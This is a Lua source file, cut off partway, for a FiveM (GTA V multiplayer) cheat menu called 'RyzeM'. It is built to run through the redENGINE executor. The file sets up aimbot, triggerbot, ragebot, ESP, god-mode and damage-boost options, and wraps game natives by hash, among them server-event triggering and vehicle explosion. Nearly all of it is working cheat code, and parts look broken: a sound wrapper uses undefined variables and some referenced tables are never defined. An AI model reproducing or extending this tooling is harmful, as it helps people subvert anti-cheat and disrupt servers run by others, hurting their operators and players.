CreateThread(function()

    local camX, camY, camZ

    local lift_height = 0.0

    local lift_inc = 0.1

    local branding = {}

    local rc_camX, rc_camY, rc_camZ, rc_camSX, rc_camSY = 0.0, 0.0, 0.0, 80.0, 0.0

    local resource_list = {}

    local resource_data = {}



    local picho = {

        Citizen = Citizen,

        math = math,

        string = string,

        debug = debug,

        type = type,

        tostring = tostring,

        tonumber = tonumber,

        json = json,

        utf8 = utf8,

        table = table,

        pairs = pairs,

        ipairs = ipairs,

        color_white = {255, 255, 255, 255},

        color_black = {255, 255, 255, 255},

        color_friend = {55, 200, 55},

        color_dead = {200, 55, 55},

        ESX = nil,

        binding = nil,

        vector_origin = vector3(0, 0, 0),

        binds = {},

        bind_handler = {},

        bind_time = 0

    }



    picho.bone_check = {{31086, "SKEL_HEAD"}, {0, "SKEL_ROOT"}, {22711, "SKEL_L_Forearm"}, {28252, "SKEL_R_Forearm"}, {45509, "SKEL_L_UpperArm"}, {40269, "SKEL_R_UpperArm"}, {58271, "SKEL_L_Thigh"}, {51826, "SKEL_R_Thigh"}, {24816, "SKEL_Spine1"}, {24817, "SKEL_Spine2"}, {24818, "SKEL_Spine3"}, {14201, "SKEL_L_Foot"}, {52301, "SKEL_R_Foot"}}

    picho.aimbot_bones = {"SKEL_HEAD", "SKEL_ROOT", "SKEL_L_Forearm", "SKEL_R_Forearm", "SKEL_L_UpperArm", "SKEL_R_UpperArm", "SKEL_L_Thigh", "SKEL_R_Thigh", "SKEL_Spine1", "SKEL_Spine2", "SKEL_Spine3", "SKEL_L_Foot", "SKEL_R_Foot"}

    picho.friends = {}

    picho.frozen_ents = {}

    picho.blacklisted_users = {}

    picho.notifications_h = 64

    picho.spectating_fov = -5.0

    picho.moving_wp = false

    picho.spike_ents = {}



    local function _Get_Executor()

        local redENGINE = (rE or {}).ConfigHandler

        if picho.type(redENGINE) == "function" then return "redENGINE" end



        return "None"

    end



    local _Executor_Strings = {

        ["redENGINE"] = "~r~redENGINE~s~",

        ["None"] = "~b~Resource~s~"

    }



    local _Executor = _Get_Executor()

    picho.Citizen.IN = picho.Citizen.InvokeNative



    local PCCT = {

        DynamicTriggers = {},

        Painter = {},

        Util = {},

        Categories = {},

        List = {},

        PlayerCache = {},

        Config = {

            Binds = {},

            Vehicle = {

                GodMode = false,

                BulletProofTires = false,

                Boost = 1.0,

                Wallride = false

            },

            Weapon = {

                DamageBoost = 1.0

            },

            Player = {

                CrossHair = false,

                Blips = false,

                ESP = false,

                Names = false,

                ESPDistance = 500.0,

                Box = false,

                Bone = false,

                OneTap = false,

                Aimbot = false,

                AimbotNeedsLOS = true,

                TriggerBotNeedsLOS = true,

                TPAimbot = false,

                TPAimbotThreshold = 40.0,

                TPAimbotDistance = 2.0,

                RageBot = false,

                TriggerBot = false,

                NoDrop = false,

                AimbotFOV = 75.0,

                AimbotBone = 1,

                AimbotKey = "MOUSE1",

                AimbotReleaseKey = "LEFTALT",

                TriggerBotDistance = 1.0,

                TargetInsideVehicles = false

            },

            UseBackgroundImage = false,

            UseSounds = true,

            UseAutoWalk = false,

            UseAutoWalkAlt = false,

            ShowKey = "PAGEDOWN",

            FreeCamKey = "HOME",

            RCCamKey = "=",

            ShowText = true,

            ShowNotifications = true,

            SafeMode = true,

            MenuX = 300,

            MenuY = 300,

            NotifX = nil,

            NotifY = nil,

            NotifW = 420,

            CurrentSelection = 1,

            SelectedCategory = "category_1",

            UsePrintMessages = false,

            DisableMovement = true,

            Tertiary = {0, 255, 255, 255}

        },

        Name = "RyzeM",

        Build = "0.5",

        FileKey = "ksdni2938489fnf92385283",

        Enabled = true,

        Showing = false,

        Base64 = {},

        MenuW = 923,

        MenuH = 583,

        _MouseX = 0,

        _MouseY = 0,

        DraggingX = nil,

        DraggingY = nil,

        CurrentPlayer = nil

    }



    local function _count(tab)

        local c = 0



        for _ in picho.pairs(tab) do

            c = c + 1

        end



        return c

    end



    function PCCT:DumpTable(tab, done, ind)

        if not tab then return end



        if not done then

            done = {}

        end



        if not ind then

            ind = 0

        end



        if done[tab] then return end



        for key, val in picho.pairs(tab) do

            print(string.rep("	", ind) .. "[" .. picho.tostring(key) .. "] = " .. picho.tostring(val))



            if picho.type(val) == "table" then

                local cum = ind + 1

                self:DumpTable(val, done, cum)

                done[val] = true

            end

        end

    end



    PCCT.Base64.CharList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"



    function PCCT.Base64:Encode(data)

        return (data:gsub(".", function(x)

            local r, b = "", x:byte()



            for i = 8, 1, -1 do

                r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0')

            end



            return r

        end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)

            if (#x < 6) then return '' end

            local c = 0



            for i = 1, 6 do

                c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0)

            end



            return self.CharList:sub(c + 1, c + 1)

        end) .. ({'', '==', '='})[#data % 3 + 1]

    end



    function PCCT:GetConfigList()

        if _Executor ~= "redENGINE" then return {} end

        local out = rE.ConfigHandler("load", "picho/list.json", "", self.FileKey)



        if out == "That file doesn't exist." or out == "Error opening file." then

            self.List = {

                [current_config] = 1

            }



            self:SetConfigList()



            return {}

        end

    end



    function PCCT:CopyTable(tab)

        local out = {}

        if type(tab) ~= "table" then return out end



        for key, val in picho.pairs(tab) do

            if picho.type(val) == "table" then

                out[key] = self:CopyTable(val)

            else

                out[key] = val

            end

        end



        return out

    end



    function PCCT:IsFriend(ped)

        local id = self:GetFunction("NetworkGetPlayerIndexFromPed")(ped)

        if not id or id < 0 then return false end



        return picho.friends[self:GetFunction("GetPlayerServerId")(id)]

    end



    PCCT.DefaultConfig = PCCT:CopyTable(PCCT.Config)

    PCCT.List = PCCT:GetConfigList()



    PCCT.ConfigClass = {

        Load = function(cfg)

            if _Executor ~= "redENGINE" then return PCCT:AddNotification("INFO", "Bienvenid@ C:", 15000) end

            local out = rE.ConfigHandler("load", "picho/" .. (cfg or current_config) .. ".json", "", PCCT.FileKey)



            if out == "That file doesn't exist." or out == "Error opening file." and (cfg or current_config) == "fm_default" then

                PCCT:AddNotification("INFO", "Creating config for the first time.")



                return PCCT.ConfigClass.Save(true)

            end



            if known_returns[out] then

                PCCT:Print("[CONFIG] Failed to load ^3" .. (cfg or current_config) .. "^7: ^1" .. out .. "^7")



                return PCCT:AddNotification("ERROR", "Failed to load config. See console for details.")

            else

                local _config = picho.json.decode(out)



                if picho.type(_config) == "table" then

                    PCCT.Config = _config

                    PCCT.Config.SafeMode = true

                    PCCT.Config.Player.ThermalVision = false

                    PCCT.Config.Player.NoClip = false

                    PCCT.Config.Player.OneTap = false

                    PCCT.Config.Player.God = false

                    PCCT.Config.Player.MagicCarpet = false

                    PCCT.Config.Player.FakeDead = false

                    PCCT.Config.Weapon.DamageBoost = 1.0

                    PCCT.Config.Weapon.InfiniteAmmo = false

                    PCCT.Config.Player.SuperJump = false

                    PCCT.Config.Player.SuperRun = false

                    PCCT.ConfigClass.DoSanityCheck()

                    PCCT:AddNotification("EXITO", "Config cargada.")

                    PCCT:Print("[CONFIG] Loaded config ^3" .. (cfg or current_config) .. "^7.")

                else

                    PCCT.ConfigClass.Save(true)

                    PCCT:Print("[CONFIG] Failed to save ^3" .. (cfg or current_config) .. "^7: ^1Invalid data.^7")



                    return PCCT:AddNotification("ERROR", "Failed to load config. See console for details.")

                end

            end

        end,

        DoSanityCheck = function()

            for key, val in picho.pairs(PCCT.DefaultConfig) do

                if type(PCCT.Config[key]) ~= type(val) then

                    PCCT.Config[key] = val

                end



                if picho.type(val) == "table" then

                    if _count(val) > 0 then

                        for k2, v2 in picho.pairs(val) do

                            if type(PCCT.Config[key][k2]) ~= type(v2) then

                                PCCT.Config[key][k2] = v2

                            end

                        end

                    elseif type(PCCT.Config[key]) ~= "table" then

                        PCCT.Config[key] = val

                    end

                end

            end

        end,

        Delete = function(name)

            if _Executor ~= "redENGINE" then return end

            local out = rE.ConfigHandler("delete", "picho/" .. name .. ".json", PCCT.FileKey)



            if out ~= "Successfully deleted config." then

                PCCT:AddNotification("ERROR", "Failed to delete config. See console for details.")



                return PCCT:Print("[CONFIG] Failed to delete ^3" .. name .. "^7: ^1" .. out .. "^7")

            end

        end,

        Rename = function(old, new)

            if _Executor ~= "redENGINE" then return end

            local existing = rE.ConfigHandler("load", "picho/" .. old .. ".json", "", PCCT.FileKey)



            if existing == "Error opening file." or existing == "That file doesn't exist." then

                PCCT:AddNotification("ERROR", "Failed to rename config. See console for details.")



                return PCCT:Print("[CONFIG] Failed to rename ^3" .. old .. " to ^3" .. new .. "^7: ^1" .. existing .. "^7")

            end

        end,

        Exists = function(name)

            if _Executor ~= "redENGINE" then return end

            local existing = rE.ConfigHandler("load", "picho/" .. name .. ".json", "", PCCT.FileKey)



            if existing == "Error opening file." or existing == "That file doesn't exist." then

                PCCT:AddNotification("ERROR", "Failed to rename config. See console for details.")



                return false

            end



            return true

        end,

        Write = function(name, cfg)

            if _Executor ~= "redENGINE" then return end

            cfg = PCCT:CopyTable(cfg)

            cfg.Player.AimbotTarget = nil

            cfg.SafeMode = nil

            cfg = picho.json.encode(cfg)

            local out = rE.ConfigHandler("save", "picho/" .. name .. ".json", cfg, PCCT.FileKey)



            if known_returns[out] and not silent then

                local good = out:find("Successfully")



                if not good then

                    PCCT:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")



                    return PCCT:AddNotification("ERROR", "Failed to save config. See console for details.")

                elseif silent == false then

                    PCCT:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")

                end

            end

        end,

        Save = function(silent)

            if _Executor ~= "redENGINE" then return end

            local config = PCCT:CopyTable(PCCT.Config)

            config.Player.AimbotTarget = nil

            config.SafeMode = nil

            config = picho.json.encode(config)

            local out = rE.ConfigHandler("save", "picho/" .. current_config .. ".json", config, PCCT.FileKey)

            PCCT.List[current_config] = PCCT.List[current_config] or (_count(PCCT.List) + 1)



            if known_returns[out] and not silent then

                local good = out:find("Successfully")



                if not good then

                    PCCT:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")



                    return PCCT:AddNotification("ERROR", "Failed to save config. See console for details.")

                elseif silent == false then

                    PCCT:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")

                end

            end

        end

    }



    local function _unpack(add)

        local out = {}



        for key, val in picho.pairs(_G) do

            out[key] = val

        end



        for key, val in picho.pairs(add) do

            out[key] = val

        end



        return out

    end



    local boundaryIdx = 1



    local function dummyUseBoundary(idx)

        return nil

    end



    local function getBoundaryFunc(bfn, bid)

        return function(fn, ...)

            local boundary = bid or (boundaryIdx + 1)

            boundaryIdx = boundaryIdx + 1

            bfn(boundary, coroutine.running())



            local wrap = function(...)

                dummyUseBoundary(boundary)

                local v = picho.table.pack(fn(...))



                return picho.table.unpack(v)

            end



            local v = picho.table.pack(wrap(...))

            bfn(boundary, nil)



            return picho.table.unpack(v)

        end

    end



    local runWithBoundaryEnd = getBoundaryFunc(picho.Citizen.SubmitBoundaryEnd)



    local function lookupify(t)

        local r = {}



        for _, v in picho.ipairs(t) do

            r[v] = true

        end



        return r

    end



    local blocked_ranges = {{0x0001F601, 0x0001F64F}, {0x00002702, 0x000027B0}, {0x0001F680, 0x0001F6C0}, {0x000024C2, 0x0001F251}, {0x0001F300, 0x0001F5FF}, {0x00002194, 0x00002199}, {0x000023E9, 0x000023F3}, {0x000025FB, 0x000026FD}, {0x0001F300, 0x0001F5FF}, {0x0001F600, 0x0001F636}, {0x0001F681, 0x0001F6C5}, {0x0001F30D, 0x0001F567}, {0x0001F980, 0x0001F984}, {0x0001F910, 0x0001F918}, {0x0001F6E0, 0x0001F6E5}, {0x0001F920, 0x0001F927}, {0x0001F919, 0x0001F91E}, {0x0001F933, 0x0001F93A}, {0x0001F93C, 0x0001F93E}, {0x0001F985, 0x0001F98F}, {0x0001F940, 0x0001F94F}, {0x0001F950, 0x0001F95F}, {0x0001F928, 0x0001F92F}, {0x0001F9D0, 0x0001F9DF}, {0x0001F9E0, 0x0001F9E6}, {0x0001F992, 0x0001F997}, {0x0001F960, 0x0001F96B}, {0x0001F9B0, 0x0001F9B9}, {0x0001F97C, 0x0001F97F}, {0x0001F9F0, 0x0001F9FF}, {0x0001F9E7, 0x0001F9EF}, {0x0001F7E0, 0x0001F7EB}, {0x0001FA90, 0x0001FA95}, {0x0001F9A5, 0x0001F9AA}, {0x0001F9BA, 0x0001F9BF}, {0x0001F9C3, 0x0001F9CA}, {0x0001FA70, 0x0001FA73}}

    local block_singles = lookupify{0x000000A9, 0x000000AE, 0x0000203C, 0x00002049, 0x000020E3, 0x00002122, 0x00002139, 0x000021A9, 0x000021AA, 0x0000231A, 0x0000231B, 0x000025AA, 0x000025AB, 0x000025B6, 0x000025C0, 0x00002934, 0x00002935, 0x00002B05, 0x00002B06, 0x00002B07, 0x00002B1B, 0x00002B1C, 0x00002B50, 0x00002B55, 0x00003030, 0x0000303D, 0x00003297, 0x00003299, 0x0001F004, 0x0001F0CF, 0x0001F6F3, 0x0001F6F4, 0x0001F6E9, 0x0001F6F0, 0x0001F6CE, 0x0001F6CD, 0x0001F6CF, 0x0001F6CB, 0x00023F8, 0x00023F9, 0x00023FA, 0x0000023, 0x0001F51F, 0x0001F6CC, 0x0001F9C0, 0x0001F6EB, 0x0001F6EC, 0x0001F6D0, 0x00023CF, 0x000002A, 0x0002328, 0x0001F5A4, 0x0001F471, 0x0001F64D, 0x0001F64E, 0x0001F645, 0x0001F646, 0x0001F681, 0x0001F64B, 0x0001F647, 0x0001F46E, 0x0001F575, 0x0001F582, 0x0001F477, 0x0001F473, 0x0001F930, 0x0001F486, 0x0001F487, 0x0001F6B6, 0x0001F3C3, 0x0001F57A, 0x0001F46F, 0x0001F3CC, 0x0001F3C4, 0x0001F6A3, 0x0001F3CA, 0x00026F9, 0x0001F3CB, 0x0001F6B5, 0x0001F6B5, 0x0001F468, 0x0001F469, 0x0001F990, 0x0001F991, 0x0001F6F5, 0x0001F6F4, 0x0001F6D1, 0x0001F6F6, 0x0001F6D2, 0x0002640, 0x0002642, 0x0002695, 0x0001F3F3, 0x0001F1FA, 0x0001F91F, 0x0001F932, 0x0001F931, 0x0001F9F8, 0x0001F9F7, 0x0001F3F4, 0x0001F970, 0x0001F973, 0x0001F974, 0x0001F97A, 0x0001F975, 0x0001F976, 0x0001F9B5, 0x0001F9B6, 0x0001F468, 0x0001F469, 0x0001F99D, 0x0001F999, 0x0001F99B, 0x0001F998, 0x0001F9A1, 0x0001F99A, 0x0001F99C, 0x0001F9A2, 0x0001F9A0, 0x0001F99F, 0x0001F96D, 0x0001F96C, 0x0001F96F, 0x0001F9C2, 0x0001F96E, 0x0001F99E, 0x0001F9C1, 0x0001F6F9, 0x0001F94E, 0x0001F94F, 0x0001F94D, 0x0000265F, 0x0000267E, 0x0001F3F4, 0x0001F971, 0x0001F90E, 0x0001F90D, 0x0001F90F, 0x0001F9CF, 0x0001F9CD, 0x0001F9CE, 0x0001F468, 0x0001F469, 0x0001F9D1, 0x0001F91D, 0x0001F46D, 0x0001F46B, 0x0001F46C, 0x0001F9AE, 0x0001F415, 0x0001F6D5, 0x0001F6FA, 0x0001FA82, 0x0001F93F, 0x0001FA80, 0x0001FA81, 0x0001F97B, 0x0001F9AF, 0x0001FA78, 0x0001FA79, 0x0001FA7A}



    function PCCT:RemoveEmojis(str)

        local new = ""



        for _, codepoint in picho.utf8.codes(str) do

            local safe = true



            if block_singles[codepoint] then

                safe = false

            else

                for _, range in picho.ipairs(blocked_ranges) do

                    if range[1] <= codepoint and codepoint <= range[2] then

                        safe = false

                        break

                    end

                end

            end



            if safe then

                new = new .. picho.utf8.char(codepoint)

            end

        end



        return new

    end



    -- Used to clean player names.

    function PCCT:CleanName(str, is_esp)

        str = str:gsub("~", "")

        str = self:RemoveEmojis(str)



        if #str >= 25 and not is_esp then

            str = str:sub(1, 25) .. "..."

        end



        return str

    end



    local _natives = {

        ["TriggerEvent"] = {

            func = function(eventName, ...)

                if not eventName then return end

                local payload = msgpack.pack({...})



                return runWithBoundaryEnd(function() return TriggerEventInternal(eventName, payload, payload:len()) end)

            end

        },

        ["TriggerServerEvent"] = {

            func = function(eventName, ...)

                if not eventName then return end

                local payload = msgpack.pack({...})



                return TriggerServerEventInternal(eventName, payload, payload:len())

            end

        },

        ["DestroyCam"] = {

            hash = 0x865908C81A2C22E9

        },

        ["IsVehicleTyreBurst"] = {

            hash = 0x48C80210,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()

            end,

            return_as = function(int) return int == 1 end

        },

        ["IsPauseMenuActive"] = {

            hash = 0xB0034A223497FFCB,

            unpack = function(...) return Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger() end,

            return_as = function(int) return int == 1 end

        },

        ["CreateRuntimeTxd"] = {

            hash = 0x1F3AC778,

            unpack = function(...)

                local args = (...)



                return args[1], Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()

            end

        },

        ["CreateDui"] = {

            hash = 0x23EAF899,

            unpack = function(...)

                local args = (...)



                return picho.tostring(args[1]), args[2], args[3], Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()

            end

        },

        ["GetDuiHandle"] = {

            hash = 0x1655D41D,

            unpack = function(...)

                local args = (...)



                return args[1], Citizen.ReturnResultAnyway(), Citizen.ResultAsString()

            end

        },

        ["CreateRuntimeTextureFromDuiHandle"] = {

            hash = 0xB135472B,

            unpack = function(...)

                local args = (...)



                return args[1], picho.tostring(args[2]), picho.tostring(args[3]), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()

            end

        },

        ["DestroyDui"] = {

            hash = 0xA085CB10,

            unpack = function(...)

                local args = (...)



                return args[1]

            end

        },

        ["GetCurrentServerEndpoint"] = {

            hash = 0xEA11BFBA,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ResultAsString()

            end

        },

        ["GetCurrentResourceName"] = {

            hash = 0xE5E9EBBB,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ResultAsString()

            end

        },

        ["GetGameTimer"] = {

            hash = 0x9CD27B0045628463,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger() end

        },

        ["GetActivePlayers"] = {

            hash = 0xcf143fb9,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsObject() end,

            return_as = function(obj) return msgpack.unpack(obj) end

        },

        ["GetVehicleNumberOfWheels"] = {

            hash = 0xEDF4B0FC,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["ExecuteCommand"] = {

            hash = 0x561C060B

        },

        ["GetVehicleNeonLightsColour"] = {

            hash = 0x7619EEE8C886757F,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueInt(), picho.Citizen.PointerValueInt(), picho.Citizen.PointerValueInt()

            end

        },

        ["GetVehicleCustomPrimaryColour"] = {

            hash = 0xB64CF2CCA9D95F52,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueInt(), picho.Citizen.PointerValueInt(), picho.Citizen.PointerValueInt()

            end

        },

        ["SetVehicleGravityAmount"] = {

            hash = 0x1A963E58

        },

        ["SetVehicleSteeringScale"] = {

            hash = 0xEB46596F

        },

        ["SetVehicleNeonLightsColour"] = {

            hash = 0x8E0A582209A62695

        },

        ["SetVehicleCustomPrimaryColour"] = {

            hash = 0x7141766F91D15BEA

        },

        ["SetVehicleCustomSecondaryColour"] = {

            hash = 0x36CED73BFED89754

        },

        ["SetVehicleSteerBias"] = {

            hash = 0x42A8EC77D5150CBE

        },

        ["SetSeethrough"] = {

            hash = 0x7E08924259E08CE0

        },

        ["SetVehicleOnGroundProperly"] = {

            hash = 0x49733E92263139D1

        },

        ["SetVehicleTyreBurst"] = {

            hash = 0xEC6A202EE4960385

        },

        ["SetVehicleLights"] = {

            hash = 0x34E710FF01247C5A

        },

        ["SetVehicleLightsMode"] = {

            hash = 0x1FD09E7390A74D54

        },

        ["SetVehicleEngineTemperature"] = {

            hash = 0x6C93C4A9

        },

        ["SetVehicleEngineCanDegrade"] = {

            hash = 0x983765856F2564F9

        },

        ["ModifyVehicleTopSpeed"] = {

            hash = 0x93A3996368C94158

        },

        ["SetVehicleWheelSize"] = {

            hash = 0x53AB5C35

        },

        ["SetVehicleWheelTireColliderSize"] = {

            hash = 0xB962D05C

        },

        ["GetVehicleMaxNumberOfPassengers"] = {

            hash = 0xA7C4F2C6E744A550,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["FindFirstVehicle"] = {

            hash = 0x15e55694,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["FindNextVehicle"] = {

            hash = 0x8839120d,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueIntInitialized(args[2]), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["EndFindVehicle"] = {

            hash = 0x9227415a,

            unpack = function(...)

                local args = (...)



                return args[1]

            end

        },

        ["FindFirstPed"] = {

            hash = 0xfb012961,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["FindNextPed"] = {

            hash = 0xab09b548,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueIntInitialized(args[2]), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["EndFindPed"] = {

            hash = 0x9615c2ad,

            unpack = function(...)

                local args = (...)



                return args[1]

            end

        },

        ["FindFirstObject"] = {

            hash = 0xFAA6CB5D,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["FindNextObject"] = {

            hash = 0x4E129DBF,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueIntInitialized(args[2]), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["EndFindObject"] = {

            hash = 0xDEDA4E50,

            unpack = function(...)

                local args = (...)



                return args[1]

            end

        },

        ["GetPlayerServerId"] = {

            hash = 0x4D97BCC7,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetNumResources"] = {

            hash = 0x863F27B,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger() end

        },

        ["GetResourceState"] = {

            hash = 0x4039B485,

            unpack = function(...)

                local args = (...)



                return picho.tostring(args[1]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsString()

            end

        },

        ["GetNumResourceMetadata"] = {

            hash = 0x776E864,

            unpack = function(...)

                local args = (...)



                return picho.tostring(args[1]), picho.tostring(args[2]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetResourceMetadata"] = {

            hash = 0x964BAB1D,

            unpack = function(...)

                local args = (...)



                return picho.tostring(args[1]), picho.tostring(args[2]), args[3], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsString()

            end

        },

        ["GetResourceByFindIndex"] = {

            hash = 0x387246b7,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsString()

            end

        },

        -- This stupid fucking function always gives issues

        ["LoadResourceFile"] = {

            func = function(...)

                local args = {...}



                return picho.Citizen.IN(0x76a9ee1f, picho.tostring(args[1]), picho.tostring(args[2]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsString())

            end

        },

        ["RequestCollisionAtCoord"] = {

            hash = 0x07503F7948F491A7,

            unpack = function(...)

                local args = (...)

                local x, y, z



                if picho.type(args[1]) == "table" or picho.type(args[1]) == "vector" then

                    x = args[1].x

                    y = args[1].y

                    z = args[1].z

                else

                    x = args[1]

                    y = args[2]

                    z = args[3]

                end



                return x, y, z, picho.Citizen.ReturnResultAnyway()

            end

        },

        ["GetEntityCoords"] = {

            hash = 0x3FEF770D40960D5A,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["RemoveBlip"] = {

            hash = 0x86A652570E5F25DD,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1])

            end

        },

        ["GetNuiCursorPosition"] = {

            hash = 0xbdba226f,

            unpack = function() return picho.Citizen.PointerValueInt(), picho.Citizen.PointerValueInt() end

        },

        ["DoesEntityExist"] = {

            hash = 0x7239B21A38F536BA,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsEntityDead"] = {

            hash = 0x5F9532F3B5CC2551,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsPedDeadOrDying"] = {

            hash = 0x3317DEDB88C95038,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsPedShooting"] = {

            hash = 0x34616828CD07F1A1,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["PlaySoundFrontend"] = {

            hash = 0x67C540AA08E4A6F5,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], args[4]

            end

        },

        ["PlaySound"] = {

            hash = 0x7FF4944CC209192D,

            function(soundId, audioName, audioRef, p3)
                return __CitIn__.InvokeNative(soundId, picho.tostring(audioName), x, y, z, picho.tostring(audioRef), isNetwork, range, p8)
            end

        },

        ["PlaySoundFromCoord"] = {

            hash = 0x8D8686B622B88120,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], args[4]

            end

        },

        ["GetPedInVehicleSeat"] = {

            hash = 0xBB40DD2270B65366,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["HasAnimpichoLoaded"] = {

            hash = 0xD031A9162D01088C,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["CreatePed"] = {

            hash = 0xD49F9B0955C367DE,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2], args[3], args[4], args[5], args[6], args[7], args[8], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["CreatePedInsideVehicle"] = {

            hash = 0x7DD959874C1FD534,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.type(args[3]) == "string" and PCCT:GetFunction("GetHashKey")(args[3]) or args[3], args[4], args[5], args[6], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["NetworkHasControlOfEntity"] = {

            hash = 0x01BF60A500E28887,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["SimulatePlayerInputGait"] = {

            hash = 0x477D5D63E63ECA5D

        },

        ["ResetPedRagdollTimer"] = {

            hash = 0x9FA4664CF62E47E8

        },

        ["IsVehicleDamaged"] = {

            hash = 0xBCDC5017D3CE1E9E,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["ToggleVehicleMod"] = {

            hash = 0x2A1F4F37F95BAD08

        },

        ["NetworkGetPlayerIndexFromPed"] = {

            hash = 0x6C0E2E0125610278,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["ResetPlayerStamina"] = {

            hash = 0xA6F312FCCE9C1DFE

        },

        ["GetEntityAlpha"] = {

            hash = 0x5A47B3B5E63E94C6,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["IsEntityVisible"] = {

            hash = 0x47D6F43D77935C75,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end,

            return_as = function(int) return int == 1 end

        },

        ["AreAnyVehicleSeatsFree"] = {

            hash = 0x2D34FC3BC4ADB780,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end,

            return_as = function(int) return int == 1 end

        },

        ["IsEntityVisibleToScript"] = {

            hash = 0xD796CB5BA8F20E32,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end,

            return_as = function(int) return int == 1 end

        },

        ["NetworkExplodeVehicle"] = {

            hash = 0x301A42153C9AD707

        },

        ["DisplayRadar"] = {

            hash = 0xA0EBB943C300E693

        },

        ["StopGameplayCamShaking"] = {

            hash = 0x0EF93E9F3D08C178

        },

        ["SetCamShakeAmplitude"] = {

            hash = 0xD93DB43B82BC0D00

        },

        ["SetCursorLocation"] = {

            hash = 0xFC695459D4D0E219

        },

        ["SetPlayerWeaponDamageModifier"] = {

            hash = 0xCE07B9F7817AADA3

        },

        ["SetPedArmour"] = {

            hash = 0xCEA04D83135264CC

        },

        ["SetEntityLocallyInvisible"] = {

